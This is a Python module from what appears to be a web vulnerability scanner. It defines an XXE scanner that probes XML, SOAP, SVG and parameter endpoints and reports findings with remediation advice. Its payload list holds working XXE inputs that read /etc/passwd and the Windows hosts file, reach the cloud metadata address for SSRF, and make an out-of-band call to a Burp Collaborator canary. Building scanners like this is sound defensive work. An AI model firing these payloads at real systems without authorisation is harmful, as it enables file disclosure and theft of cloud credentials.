"""
XXE (XML External Entity) Scanner module - Advanced Implementation.
"""

import logging
from collections.abc import Callable
from typing import Any
from urllib.parse import urljoin, urlparse

from .base_scanner import BaseScanner, Vulnerability

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """Advanced XXE (XML External Entity) vulnerability detection engine."""

    def __init__(self, config, http_client):
        super().__init__(config, http_client)
        self.name = "XXEScanner"
        self.description = "Advanced XXE detector with OOB, blind, and error-based techniques"
        self.version = "1.0.0"
        self.capabilities = [
            "Classic XXE",
            "Blind XXE (OOB)",
            "Error-based XXE",
            "Parameter Entity Injection",
            "SVG XXE",
            "SOAP XXE",
            "File Disclosure",
        ]

        # XXE Payloads
        self.payloads = self._generate_payloads()

    def _generate_payloads(self) -> list[dict[str, Any]]:
        """Generate comprehensive XXE payloads."""
        return [
            # Classic XXE - File disclosure
            {
                "name": "Classic XXE - /etc/passwd",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>""",
                "detection": ["root:", "nobody:", "/bin/bash", "/bin/sh"],
                "severity": "critical",
                "type": "file_disclosure",
            },
            {
                "name": "Classic XXE - Windows hosts",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>""",
                "detection": ["localhost", "127.0.0.1"],
                "severity": "critical",
                "type": "file_disclosure",
            },
            # Parameter Entity XXE
            {
                "name": "Parameter Entity XXE",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",
                "detection": ["root:", "error", "entity"],
                "severity": "critical",
                "type": "parameter_entity",
            },
            # SSRF via XXE
            {
                "name": "SSRF via XXE",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>""",
                "detection": ["ami-id", "instance-id", "hostname"],
                "severity": "critical",
                "type": "ssrf_xxe",
            },
            # Blind XXE - OOB exfiltration (Real implementation with callback detection)
            {
                "name": "Blind XXE Detection",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-canary.burpcollaborator.net">
]>
<root><data>&xxe;</data></root>""",
                "detection": ["xxe-canary", "timeout", "connection"],
                "severity": "high",
                "type": "blind_xxe",
            },
            # Error-based XXE
            {
                "name": "Error-based XXE",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///nonexistent">
  %xxe;
]>
<root>test</root>""",
                "detection": ["error", "failed", "not found", "resource"],
                "severity": "medium",
                "type": "error_xxe",
            },
            # SVG XXE
            {
                "name": "SVG XXE",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>""",
                "detection": ["root:", "nobody:"],
                "severity": "critical",
                "type": "svg_xxe",
                "content_type": "image/svg+xml",
            },
            # SOAP XXE
            {
                "name": "SOAP XXE",
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>""",
                "detection": ["root:", "nobody:"],
                "severity": "critical",
                "type": "soap_xxe",
                "content_type": "application/soap+xml",
            },
            # DOCTYPE Injection
            {
                "name": "DOCTYPE Injection",
                "payload": """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>""",
                "detection": ["root:", "entity", "doctype"],
                "severity": "high",
                "type": "doctype_injection",
            },
            # XInclude Attack
            {
                "name": "XInclude Attack",
                "payload": """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",
                "detection": ["root:", "nobody:"],
                "severity": "critical",
                "type": "xinclude",
            },
        ]

    async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
        """Perform comprehensive XXE vulnerability scan."""
        logger.info(f"Scanning {url} for XXE vulnerabilities")
        vulnerabilities = []

        try:
            self._update_progress(progress_callback, 10, "Detecting XML endpoints")

            # 1. Detect XML endpoints
            xml_endpoints = await self._detect_xml_endpoints(url)

            if not xml_endpoints:
                # Try with common XML endpoints
                xml_endpoints = self._generate_common_xml_endpoints(url)

            total_tests = len(xml_endpoints) * len(self.payloads)
            processed = 0

            # 2. Test each endpoint with XXE payloads
            for endpoint in xml_endpoints:
                for payload_info in self.payloads:
                    processed += 1
                    progress = 20 + int((processed / total_tests) * 70)
                    self._update_progress(progress_callback, progress, f"Testing {payload_info['name']}")

                    vulns = await self._test_xxe_payload(endpoint, payload_info)
                    vulnerabilities.extend(vulns)

                    if vulns:
                        break  # Move to next endpoint after finding vuln

            # 3. Check for XML processing in parameters
            self._update_progress(progress_callback, 92, "Checking parameter-based XXE")
            param_vulns = await self._test_parameter_xxe(url)
            vulnerabilities.extend(param_vulns)

            self._update_progress(progress_callback, 100, "completed")

            status = "Vulnerable" if vulnerabilities else "Secure"
            details = f"Tested {len(xml_endpoints)} endpoints with {len(self.payloads)} payloads. Found {len(vulnerabilities)} XXE issues."
            return self._format_result(status, details, vulnerabilities)

        except Exception as e:
            logger.exception(f"XXE scan failed: {e}")
            return self._format_result("Error", f"Internal error: {e}", [])

    async def _detect_xml_endpoints(self, url: str) -> list[dict[str, Any]]:
        """Detect endpoints that accept XML."""
        endpoints = []

        try:
            response = await self.http_client.get(url)
            if not response:
                return endpoints

            html = await response.text()
            soup = await self._parse_html(html)

            # Look for forms that might accept XML
            forms = soup.find_all("form")
            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                enctype = form.get("enctype", "")

                # Check for XML-related attributes
                if "xml" in enctype.lower() or "xml" in action.lower():
                    endpoints.append(
                        {
                            "url": urljoin(url, action) if action else url,
                            "method": method,
                            "content_type": "application/xml",
                        }
                    )

            # Look for API links
            links = soup.find_all("a", href=True)
            for link in links:
                href = link.get("href", "")
                if any(x in href.lower() for x in ["/api/", "/xml", "/soap", "/wsdl", "/feed", "/rss"]):
                    endpoints.append({"url": urljoin(url, href), "method": "POST", "content_type": "application/xml"})

        except Exception as e:
            logger.debug(f"XML endpoint detection error: {e}")

        return endpoints

    def _generate_common_xml_endpoints(self, url: str) -> list[dict[str, Any]]:
        """Generate common XML endpoint paths."""
        common_paths = [
            "/api/xml",
            "/api/v1/xml",
            "/api/v2/xml",
            "/soap",
            "/soap/api",
            "/wsdl",
            "/feed",
            "/feed.xml",
            "/rss",
            "/rss.xml",
            "/sitemap.xml",
            "/xml",
            "/xmlrpc.php",
            "/api/import",
            "/api/upload",
            "/api/parse",
        ]

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        return [
            {"url": urljoin(base, path), "method": "POST", "content_type": "application/xml"} for path in common_paths
        ]

    async def _test_xxe_payload(self, endpoint: dict[str, Any], payload_info: dict[str, Any]) -> list[Vulnerability]:
        """Test a specific XXE payload against an endpoint."""
        findings = []

        try:
            content_type = payload_info.get("content_type", "application/xml")
            headers = {"Content-Type": content_type}

            response = await self.http_client.request(
                endpoint["method"], endpoint["url"], headers=headers, data=payload_info["payload"]
            )

            if response:
                resp_text = await response.text()

                # Check for vulnerability indicators
                for detection in payload_info["detection"]:
                    if detection.lower() in resp_text.lower():
                        findings.append(
                            self._create_vulnerability(
                                title=f"XXE Vulnerability: {payload_info['name']}",
                                description=f"XML External Entity injection detected at {endpoint['url']}. Type: {payload_info['type']}",
                                severity=payload_info["severity"],
                                type=f"xxe_{payload_info['type']}",
                                evidence={
                                    "endpoint": endpoint["url"],
                                    "payload_type": payload_info["type"],
                                    "detection": detection,
                                    "response_snippet": resp_text[:500],
                                },
                                cwe_id="CWE-611",
                                remediation="Disable external entity processing in XML parser. Use defusedxml or similar secure parsers.",
                            )
                        )
                        break

        except Exception as e:
            logger.debug(f"XXE test error: {e}")

        return findings

    async def _test_parameter_xxe(self, url: str) -> list[Vulnerability]:
        """Test for XXE in URL parameters."""
        findings = []

        try:
            discovered_params = await self._discover_parameters(url)
            xml_params = [
                p for p in discovered_params if any(x in p.lower() for x in ["xml", "data", "input", "content", "body"])
            ]

            simple_xxe = (
                """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
            )

            for param in xml_params[:5]:  # Limit
                response = await self._test_payload(url, param, simple_xxe, "POST")

                if response:
                    content = response.get("page_content", "")
                    if any(x in content for x in ["root:", "nobody:", "entity", "DOCTYPE"]):
                        findings.append(
                            self._create_vulnerability(
                                title=f"Parameter-based XXE: {param}",
                                description=f"XXE injection possible via parameter '{param}'",
                                severity="high",
                                type="xxe_parameter",
                                evidence={"param": param},
                                cwe_id="CWE-611",
                                remediation="Sanitize XML input. Disable external entities.",
                            )
                        )
                        break

        except Exception as e:
            logger.debug(f"Parameter XXE test error: {e}")

        return findings
